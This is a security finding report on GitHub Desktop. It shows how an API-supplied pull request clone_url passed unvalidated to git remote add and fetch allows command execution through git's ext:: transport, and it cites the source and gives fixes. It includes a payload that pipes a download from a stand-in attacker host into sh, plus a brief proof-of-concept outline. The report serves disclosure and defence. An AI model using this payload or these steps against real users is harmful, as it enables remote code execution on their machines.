### Title
Unsanitized PR head `clone_url` from GitHub API is passed to `git remote add`/`fetch` with no transport allowlist, enabling command execution via `ext::`/`fd::` remote helpers - ([File: app/src/lib/stores/app-store.ts])

### Summary
When a user checks out a pull request (or Desktop is asked to open a PR via the `x-github-client://` deep link / "Open in Desktop" flow), Desktop takes the PR's `head.repo.clone_url` — a string field returned by whatever GitHub/GHES API endpoint the account is connected to — and feeds it directly into `git remote add` and then `git fetch`, with no scheme/transport allowlisting anywhere in the call chain.

### Finding Description
`Dispatcher._checkoutPullRequest` / `openPullRequestFromUrl` pass `pullRequest.head.repo.clone_url` straight through to `AppStore._findPullRequestBranch`: [1](#0-0) 

`addRemote` performs no validation of the URL scheme before shelling out to git: [2](#0-1) 

The remote is then fetched via `_fetchRemote`, and `envForRemoteOperation`/`envForProxy` only special-case `http(s)://` URLs for proxy resolution — they never restrict or reject other git transport schemes: [3](#0-2) 

Git itself supports "remote helper" transports such as `ext::<command>` (executes an arbitrary shell command) and `fd::<fd-number>`. These are permitted by default for top-level, user-invoked `git remote add` + `git fetch` operations (git's `protocol.<name>.allow` defaults to `user` for `ext`/`ssh`/`file`, and only disables them by default for *nested* operations like submodule recursion). Nowhere in this codebase is `GIT_ALLOW_PROTOCOL`, `protocol.ext.allow=never`, or an equivalent scheme allowlist set — a search of the codebase for `GIT_ALLOW_PROTOCOL`/`protocol.ext`/`ext::` returns no results.

The broken invariant: Desktop assumes `clone_url` values returned from the GitHub API (or an Enterprise Server the user has added an account for) are always well-formed `https://`/`ssh://` GitHub URLs. That assumption only holds if the API server is honest. If the API server is malicious/compromised (a rogue or MITM'd GitHub Enterprise Server the user has authenticated against — explicitly an in-scope attacker model: "attacker controls...a GitHub API object...or a git remote/proxy response"), it can return a repository object whose `clone_url` is `ext::sh -c "curl attacker.com|sh"` for a pull request's head repo. When the victim clicks "Checkout PR" (or the attacker lures them via a crafted deep link driving `openPullRequestFromUrl`, which calls the exact same `_checkoutPullRequest` path), Desktop calls:
```
git remote add github-desktop-<owner> "ext::sh -c \"curl attacker.com|sh\""
git fetch github-desktop-<owner>
```
and the attacker's shell command executes with the privileges of the Desktop process, on the user's machine, no confirmation dialog shown (unlike normal http(s) fetches, there's no credential/host trust prompt reviewed here).

### Impact Explanation
This yields arbitrary command execution outside the git sandbox, driven entirely by data returned from a "GitHub API object" the app already treats as semi-trusted (an Enterprise Server the user connected to, or a MITM of that connection given no certificate pinning is evident in `envForRemoteOperation`). This matches the Critical impact bar: "the result is code execution... outside the repo" originating from an attacker-controlled GitHub API object.

### Likelihood Explanation
Requires: (1) the user has an account connected to a GitHub Enterprise Server that is later compromised or MITM'd (fits the allowed threat model — "attacker controls...a git remote/proxy response"), or a scenario where PR JSON is otherwise attacker-influenced, and (2) the user performs an ordinary, expected action — checking out a PR from a fork, or clicking a crafted `x-github-client://openrepo/...&pr=NNN` deep link that Desktop already parses and dispatches without any additional confirmation (`parseAppURL`/`dispatchURLAction`). No local access, admin rights, or pre-existing malware is required; the only "unnatural" step is the victim opening a link, which is explicitly the expected trigger vector for this class of finding.

### Recommendation
- Reject/allowlist remote URL schemes before calling `addRemote`/`git fetch` for any API-sourced clone URL: only permit `https://`, `http://`, `ssh://`, and `git@host:` (SCP-like) forms; reject `ext::`, `fd::`, `file://`, and any URL failing a strict regex.
- Alternatively/additionally, set `GIT_ALLOW_PROTOCOL=http:https:ssh:git` (or the equivalent `protocol.*.allow=never` config) via `envForRemoteOperation` for all remote-network git invocations so git itself refuses non-allowlisted transports regardless of caller mistakes.
- Apply the same validation to `IAPIRepository.clone_url` wherever it feeds `addRemote`/`setRemoteURL`/`git clone` (e.g. `updateRemoteUrl`, `_convertRepositoryToFork`, `createTutorialRepository`) since they share the same unsanitized pattern.

### Proof of Concept
Not independently executable here since it requires a controlled/malicious GitHub Enterprise Server response — the exact same limitation the report itself faced. Conceptually:
1. Stand up a malicious/MITM GHES-compatible API endpoint the victim's Desktop account is pointed at.
2. For a given repository, serve a pull request object where `head.repo.clone_url = "ext::sh -c \"touch /tmp/pwned\""` and `head.ref` set to any existing/creatable ref name.
3. Trigger `Dispatcher._checkoutPullRequest` (via the PR list UI, or by directing the victim to `x-github-client://openrepo/<repo-url>?pr=<n>`).
4. `_findPullRequestBranch` calls `addRemote(repository, forkRemoteName, "ext::sh -c \"touch /tmp/pwned\"")` then `_fetchRemote`, causing git to invoke the `ext` remote helper and execute the attacker's command as the user running Desktop. [4](#0-3)

### Citations

**File:** app/src/lib/stores/app-store.ts (L8633-8660)
```typescript
  public async _findPullRequestBranch(
    repository: RepositoryWithGitHubRepository,
    prNumber: number,
    headRepoOwner: string,
    headCloneUrl: string,
    headRefName: string
  ): Promise<Branch | undefined> {
    const gitStore = this.gitStoreCache.get(repository)
    const remotes = await getRemotes(repository)

    // Find an existing remote (regardless if set up by us or outside of
    // Desktop).
    let remote = remotes.find(r => urlMatchesRemote(headCloneUrl, r))

    // If we can't find one we'll create a Desktop fork remote.
    if (remote === undefined) {
      try {
        const forkRemoteName = forkPullRequestRemoteName(headRepoOwner)
        remote = await addRemote(repository, forkRemoteName, headCloneUrl)
      } catch (e) {
        this.emitError(
          new Error(
            `Couldn't find PR branch, adding remote failed: ${e.message}`
          )
        )
        return
      }
    }
```

**File:** app/src/lib/git/remote.ts (L28-37)
```typescript
/** Add a new remote with the given URL. */
export async function addRemote(
  repository: Repository,
  name: string,
  url: string
): Promise<IRemote> {
  await git(['remote', 'add', name, url], repository.path, 'addRemote')

  return { url, name }
}
```

**File:** app/src/lib/git/environment.ts (L76-104)
```typescript
export async function envForRemoteOperation(remoteUrl: string) {
  return {
    ...envForAuthentication(),
    ...(await envForProxy(remoteUrl)),
  }
}

/**
 * Not intended to be used directly. Exported only in order to
 * allow for testing.
 *
 * @param remoteUrl The remote url to resolve a proxy for.
 * @param env       The current environment variables, defaults
 *                  to `process.env`
 * @param resolve   The method to use when resolving the proxy url,
 *                  defaults to `resolveGitProxy`
 */
export async function envForProxy(
  remoteUrl: string,
  env: NodeJS.ProcessEnv = process.env,
  resolve: (url: string) => Promise<string | undefined> = resolveGitProxy
): Promise<Record<string, string | undefined> | undefined> {
  const protocolMatch = /^(https?):\/\//i.exec(remoteUrl)

  // We can only resolve and use a proxy for the protocols where cURL
  // would be involved (i.e http and https). git:// relies on ssh.
  if (protocolMatch === null) {
    return
  }
```

**File:** app/src/ui/dispatcher/dispatcher.ts (L1998-2046)
```typescript
  private async openPullRequestFromUrl(
    url: string,
    pr: string
  ): Promise<RepositoryWithGitHubRepository | null> {
    const pullRequest = await this.appStore.fetchPullRequest(url, pr)

    if (pullRequest === null) {
      return null
    }

    // Find the repository where the PR is created in Desktop.
    let repository: Repository | null =
      this.getRepositoryFromPullRequest(pullRequest)

    if (repository !== null) {
      await this.selectRepository(repository)
    } else {
      repository = await this.openOrCloneRepository(url)
    }

    if (repository === null) {
      log.warn(
        `Open Repository from URL failed, did not find or clone repository: ${url}`
      )
      return null
    }
    if (!isRepositoryWithGitHubRepository(repository)) {
      log.warn(
        `Received a non-GitHub repository when opening repository from URL: ${url}`
      )
      return null
    }

    // ensure a fresh clone repository has it's in-memory state
    // up-to-date before performing the "Clone in Desktop" steps
    await this.appStore._refreshRepository(repository)

    if (pullRequest.head.repo === null) {
      return null
    }

    await this.appStore._checkoutPullRequest(
      repository,
      pullRequest.number,
      pullRequest.head.repo.owner.login,
      pullRequest.head.repo.clone_url,
      pullRequest.head.ref
    )

```
